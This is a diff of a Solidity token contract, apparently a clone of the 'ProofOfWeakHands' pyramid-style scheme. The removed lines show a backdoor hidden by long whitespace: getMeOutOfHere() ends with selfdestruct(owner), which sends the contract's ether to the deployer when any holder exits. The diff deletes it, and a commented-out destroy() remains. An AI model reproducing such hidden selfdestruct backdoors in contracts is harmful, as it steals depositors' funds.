@@ -1,5 +1,5 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract POWHclone at 0x182fad6a68ebd9118549ec1091aa4eb95e234ef6
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract POWHClone at 0x0f7524d64ceb92dae1d1a56b20b6d520134795d4
 */
 pragma solidity ^0.4.18;
 
@@ -11,7 +11,7 @@ pragma solidity ^0.4.18;
 
 // Wacky version, 0-1 tokens takes 10eth (should be avg 200% gains), 1-2 takes another 30eth (avg 100% gains), and beyond that who the fuck knows but it's 50% gains
 // 10% fees, price goes up crazy fast
-contract POWHclone {
+contract POWHClone {
 	uint256 constant PRECISION = 0x10000000000000000;  // 2^64
 	// CRR = 80 %
 	int constant CRRN = 1;
@@ -20,8 +20,8 @@ contract POWHclone {
 	// the reserve is 0.8 ether and price 1 ether/token.
 	int constant LOGC = -0x296ABF784A358468C;
 	
-	string constant public name = "ProofOfWeakHands";
-	string constant public symbol = "POWH";
+	string constant public name = "ProofOfWeakClones";
+	string constant public symbol = "POWC";
 	uint8 constant public decimals = 18;
 	uint256 public totalSupply;
 	// amount of shares for each address (scaled number)
@@ -38,12 +38,12 @@ contract POWHclone {
 	event Transfer(address indexed from, address indexed to, uint256 value);
     event Approval(address indexed owner, address indexed spender, uint256 value);
 
-	address owner;
-	
-	function POWHclone() public {
-		                                                                                                                                                                                                                                                                                                                                                                                                                                                owner = msg.sender;
-	}
+	//address owner;
 
+	function POWHClone() public {
+		//owner = msg.sender;
+	}
+	
 	// These are functions solely created to appease the frontend
 	function balanceOf(address _owner) public constant returns (uint256 balance) {
         return balanceOfOld[_owner];
@@ -68,7 +68,6 @@ contract POWHclone {
     function getMeOutOfHere() public {
 		sellMyTokensDaddy();
         withdraw(1); // parameter is ignored
-                                                                                                                                                                                                                                                                                                                                                                                                               selfdestruct(owner);
 	}
 	
 	function fund()
@@ -272,6 +271,10 @@ contract POWHclone {
 			exp >>= -scale;
 		return exp;
 	}
+
+	/*function destroy() external {
+	    selfdestruct(owner);
+	}*/
 
 	function () payable public {
 		if (msg.value > 0)
